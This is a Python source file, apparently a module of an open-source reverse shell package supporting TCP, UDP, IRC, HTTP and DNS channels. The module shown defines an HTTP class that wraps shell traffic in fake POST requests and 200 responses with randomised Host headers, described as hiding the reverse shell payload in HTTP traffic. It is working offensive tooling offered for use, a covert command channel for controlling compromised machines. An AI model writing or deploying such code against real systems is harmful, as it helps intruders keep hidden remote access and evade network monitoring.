#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements an advanced reverse shell console.
#    Copyright (C) 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""

__version__ = "0.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/ReverseShell"

copyright = """
ReverseShell  Copyright (C) 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = ["HTTP"]

from .base import ApplicationBaseClass
from .utils import get_random_domain


class HTTP(ApplicationBaseClass):
    """
    This class parses and writes HTTP request and response.
    """

    def __init__(self, url_path: str = "/"):
        self.path = url_path.encode("ascii")

    def parse(self, data: bytes) -> bytes:
        """
        This method parses HTTP request and response.
        """

        if b"\r\n\r\n" in data:
            return data.split(b"\r\n\r\n", 1)[1]

        raise ValueError("This is not a HTTP resquest or response.")

    parse_request = parse
    parse_response = parse
    initialization_response = initialization_request = lambda *x: None

    def wrap_response(self, data: bytes, is_encrypted: bool = False) -> bytes:
        """
        This method writes data in HTTP response to
        hide ReverseShell payload in HTTP traffic.
        """

        return (
            b"HTTP/1.0 200 OK\r\nContent-Type: "
            + (
                b"octect/stream"
                if is_encrypted
                else b"text/plain; charset=utf-8"
            )
            + b"\r\n"
            + b"Content-Length: "
            + str(len(data)).encode()
            + b"\r\n\r\n"
            + data
        )

    def wrap_request(self, data: bytes, is_encrypted: bool = False) -> bytes:
        """
        This method writes data in HTTP request to hide
        ReverseShell response in HTTP traffic.
        """

        return (
            b"POST "
            + self.path
            + b" HTTP/1.0\r\nContent-Type: "
            + (
                b"octect/stream"
                if is_encrypted
                else b"text/plain; charset=utf-8"
            )
            + b"\r\nHost: "
            + get_random_domain()
            + b"\r\nContent-Length: "
            + str(len(data)).encode()
            + b"\r\n\r\n"
            + data
        )
